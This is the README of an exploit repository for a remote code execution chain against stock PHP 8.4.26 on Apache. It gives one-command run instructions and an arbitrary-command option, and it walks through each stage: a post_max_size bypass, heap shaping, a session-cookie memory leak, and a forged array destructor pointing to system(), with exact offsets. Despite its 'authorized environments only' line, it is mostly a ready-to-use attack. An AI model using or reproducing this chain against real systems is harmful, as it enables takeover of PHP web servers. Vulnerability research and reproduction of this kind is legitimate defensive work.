# php2shell — PHP 8.4.26 session vulnerability reproduction

[中文](README.md) | English

**The target has not changed: stock official `php:8.4.26-apache` with the
official `php.ini-production` — `display_errors=Off`,
`display_startup_errors=Off`, `memory_limit=128M`, `post_max_size=8M`,
single-worker prefork.** Under the constraints of being fully remote,
HTTP-only, with the target page containing only `<?php echo "OK\n"; ?>`
and no PHP written on the target side, one command reaches RCE:

- stock official image + official ini: **5/5**
- the same official build with symbols (gdb used only for offline
  calibration, never on the delivery path): **15/15**
- about 2 seconds per run, the worker is not restarted, the target ini is
  left untouched

## Quick start (official php.ini-production / display_errors=Off / 128M)

```bash
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) Start the target: stock official image; the container only copies the
#    official php.ini-production to php.ini.
./pure/run_pure.sh
# target: OK
# PHP 8.4.26 ...
# display_errors => Off => Off
# memory_limit => 128M => 128M

# 2) One command: A1 -> B1 leak -> A2 -> B2 -> id
python3 pure/pwn_pure.py --port 18110
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

No PHP/Apache build, no image build, no gdb, no ini changes.
`pure/run_pure.sh` uses container `p2s-pure-18110` on port `18110` by
default and prints the effective `display_errors` / `memory_limit` /
`post_max_size` values. On Linux without docker-group access it falls back
to `sudo docker`; you can also force `DOCKER="sudo docker" ./pure/run_pure.sh`.
`--dbg` only switches to the symbolic build of the same official version
for offline calibration.

Common options:

```bash
# Re-test with fresh ASLR (restart the container)
python3 pure/pwn_pure.py --port 18110 --restart p2s-pure-18110

# Arbitrary command: write a script into the mounted directory, then run sh
printf 'id; uname -a > /out/p1\n' > out/c
python3 pure/pwn_pure.py --port 18110 --cmd 'sh</out/c'
```

`--retries` defaults to 3. If the most common pointer in an OOB window is
not `zval_ptr_dtor`, the script rejects that leak via the plausible
`libphp-main` delta check and reruns the whole chain.

## The pure-HTTP chain

The target page is only `<?php echo "OK\n"; ?>`; the attack traffic is
chunked multipart plus ordinary GET/POST:

1. **Chunked bypass of `post_max_size`**: without `Content-Length`,
   `content_length=0`, so the check at the top of
   `rfc1867_post_handler` is skipped; bodies far larger than 8M can be
   used for heap shaping.
2. **A1**: 860 depth-64 nested file fields + fillers + large values + a
   4000B `PHP_SESSION_UPLOAD_PROGRESS`, causing an OOM inside
   `php_url_encode` during END cleanup. The bailout leaves dangling
   `PS(id)` / `PS(mod_data)` and `send_cookie=1`.
3. **B1 (OOB read)**: after a safe close, `PS(id)` points at a forged
   `zend_string` header (len=0xC8000, data containing `/`), and
   `Set-Cookie` encodes 800KB of memory starting at the id chunk. The
   window contains:
   - 2MiB-aligned chunk pointer clusters -> id chunk / main chunk base;
   - the hole left by `G:400` at the tail of the id chunk is filled by
     900 nested-array fields; the real HashTables' `pDestructor =
     zval_ptr_dtor` appears 1095 times -> `libphp = value - 0x65EB60`.
4. **A2 + B2**: cheap-OOM points `PS(hash_serialize_verifier)` into the
   heap (`main+0x7D720`); B2 overwrites it with a 384B reference value
   that points at a zval at `S=main+0xF8398`. The fake zend_array at S
   has `pDestructor = zif_system` (`libphp+0x465370`); during shutdown
   `zend_hash_destroy` calls `system("id>/out/p1")`.

Offsets (this build, ASLR-independent):

| Symbol/location | Value |
|---|---|
| `zval_ptr_dtor` | `libphp+0x65EB60` |
| `zif_system` | `libphp+0x465370` |
| fake array `S` | `main+0xF8398` |
| A2 `hsv` | `main+0x7D720` |

Target environment: Debian 13 (trixie), Apache 2.4.69 prefork, PHP 8.4.26
NTS mod_php, files session handler. A different PHP build/version needs
fresh offsets; ASLR changes per container start, and the two leaks in the
chain derive it at runtime.

## Evidence

- Mechanism and calibration: [pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
- Full-chain script: [pure/pwn_pure.py](pure/pwn_pure.py)
- Debug-image batch log: [pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
- Official-image log: [pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
- Proof: [pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)

## Legacy (not the target)

The early `exploit.py` used a **custom** `docker/php.ini`
(`display_errors=On`, `memory_limit=8M`, `max_input_vars=1000`). It is
unrelated to the official-config target above and is kept only as a
historical/mechanism reference; [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md),
[ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md), and
[DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md) describe that line.

## Reproduction statement

- The target configuration is the official `php.ini-production`
  (`display_errors=Off`, `memory_limit=128M`): no custom ini, no
  `display_errors=On` dependency, no target-side files, no
  `session_start()`, and no gdb on the delivery path.
- For vulnerability research and reproduction in authorized environments
  only.
